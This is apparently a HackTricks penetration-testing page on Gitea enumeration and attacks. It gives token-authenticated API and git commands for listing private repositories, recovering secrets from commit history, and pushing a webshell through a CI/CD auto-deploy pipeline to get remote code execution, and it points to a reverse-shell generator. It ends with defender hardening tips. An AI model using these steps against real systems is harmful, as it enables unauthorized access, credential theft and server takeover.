# Gitea Enumeration & Attacks

{{#include ../../banners/hacktricks-training.md}}

## Overview

This page covers practical techniques to enumerate and abuse a Gitea instance after obtaining credentials or a personal access token. It focuses on:
- Recovering secrets from Git history (commit diffs)
- Discovering and using the REST API via /api/swagger
- Authenticating to the API with personal access tokens
- Enumerating repositories and repository contents
- Abusing CI/CD auto-deploy pipelines to turn repo write access into arbitrary file write on the production web server (leading to webshell RCE on IIS/ASP.NET; generalizes to PHP/JSP/etc.)

> Note: General background on Gitea accounts, tokens, SSH/GPG, and branch protections is in:
> basic-gitea-information.md

## API Discovery (Swagger)

Gitea ships interactive API docs at:
- http(s)://<gitea-host>/api/swagger

Use it to identify useful endpoints under /api/v1 such as:
- GET /user/repos – list repositories visible to the authenticated user
- GET /repos/{owner}/{repo}/contents – list/inspect repository contents

## API Authentication with Personal Access Tokens

Personal access tokens act as full user credentials for API usage (and Git over HTTPS). Two commonly accepted HTTP Authorization header formats:
- Authorization: token <TOKEN>
- Authorization: Bearer <TOKEN>

Example: list repositories for the authenticated user:

```bash
curl -sS http://gitea.local:3000/api/v1/user/repos \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" | jq '.[].full_name'
```

Cloning over HTTPS with a token in the URL (works when basic auth is enabled):

```bash
# Format: https://<token>@<host>/<owner>/<repo>.git
# Or http://<token>@...

git clone http://${GITEA_ACCESS_TOKEN}@gitea.local:3000/owner/private-site.git
```

## Enumerate Repositories

List repos visible to the token:

```bash
curl -sS http://gitea.local:3000/api/v1/user/repos \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" | jq -r '.[].full_name'
```

Get details on a specific repo:

```bash
curl -sS http://gitea.local:3000/api/v1/repos/owner/repo \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" | jq .
```

## Enumerate Repository Contents

List top-level files and directories:

```bash
curl -sS http://gitea.local:3000/api/v1/repos/owner/repo/contents \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" | jq -r '.[].name'
```

Read a specific file (content is base64-encoded in the content field):

```bash
curl -sS http://gitea.local:3000/api/v1/repos/owner/repo/contents/README.md \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" |
  jq -r .content | base64 -d
```

Tip: You can add a ref query parameter to target a specific branch/commit:

```bash
curl -sS 'http://gitea.local:3000/api/v1/repos/owner/repo/contents/path/to/file?ref=main' \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" | jq -r .content | base64 -d
```

## Git History Secret Recovery

Developers often “remove” secrets by committing a follow-up change, but the original secret remains in history:

- Use the web UI to browse commits and diffs for removed tokens/keys
- Or locally clone and search commit history:

```bash
# Shallow clone first, then deepen if needed
git clone --depth 50 http://gitea.local:3000/owner/public-repo.git
cd public-repo

# Show recent diffs
git log -p

# Examine a specific commit’s diff
git show <commit_id>

# Grep for likely secrets (adjust patterns)
git log -p | grep -E "(?i)(token|secret|apikey|password)"
```

If you recover a valid Gitea personal access token, pivot to the API using the techniques above to enumerate private repos/contents.

## Abusing CI/CD Auto-Deploy Pipelines → Arbitrary File Write → Webshell RCE

If a repository is configured so that pushing changes automatically deploys to production (for example via Gitea Actions, webhooks, or an external runner), having write access to that repo effectively provides an arbitrary file write primitive on the target system.

For IIS/ASP.NET sites, you can achieve command execution by deploying a server-side file such as an .aspx webshell into the web root.

Example workflow (IIS/ASP.NET):

```bash
# 1) Clone the private website repo using the recovered token
export GITEA_ACCESS_TOKEN="<token>"

git clone http://${GITEA_ACCESS_TOKEN}@gitea.local:3000/owner/website.git
cd website

# 2) Add an ASPX webshell to the repo root (served by IIS)
cp /path/to/webshell-LT.aspx shell.aspx

git add shell.aspx
git commit -m "update"

# 3) Push changes; the CI/CD auto-deploy will publish to IIS
git push

# 4) Trigger OS commands via the new endpoint
#    Example: visit http://target/shell.aspx and execute a PowerShell payload
```

Notes and generalizations:
- For PHP/JSP sites, deploy an appropriate server-side webshell (e.g., .php or .jsp)
- If the pipeline sanitizes certain extensions, look for other code execution paths (for example, upload a web.config to map handlers or abuse existing build steps)
- Consider indirect file write through assets that the application processes

Example ASPX webshell used in the wild:
- [https://github.com/grov/webshell/blob/master/webshell-LT.aspx](https://github.com/grov/webshell/blob/master/webshell-LT.aspx)

Once the webshell is live, paste a PowerShell reverse shell (for example, generated at https://www.revshells.com/) to get an interactive session.

## Hardening Tips (Defenders)
- Do not auto-deploy unreviewed commits to production; require code review and approvals
- Store secrets out of Git history; rotate any token/secret removed from a repo
- Protect branches and enforce CI policies; minimize who has write access
- Scope and rotate personal access tokens; monitor /api/v1 usage
- Audit webhooks and deployment runners; restrict what file types can be deployed

## References

- [HTB: Lock (0xdf) – Gitea token → CI/CD to IIS RCE](https://0xdf.gitlab.io/2025/08/21/htb-lock.html)
- [Gitea API Swagger](https://try.gitea.io/api/swagger)
- [Gitea API usage docs](https://docs.gitea.com/development/api-usage)
- [ASPX LT webshell PoC](https://github.com/grov/webshell/blob/master/webshell-LT.aspx)
- [Reverse shell payload helper](https://www.revshells.com/)

{{#include ../../banners/hacktricks-training.md}}
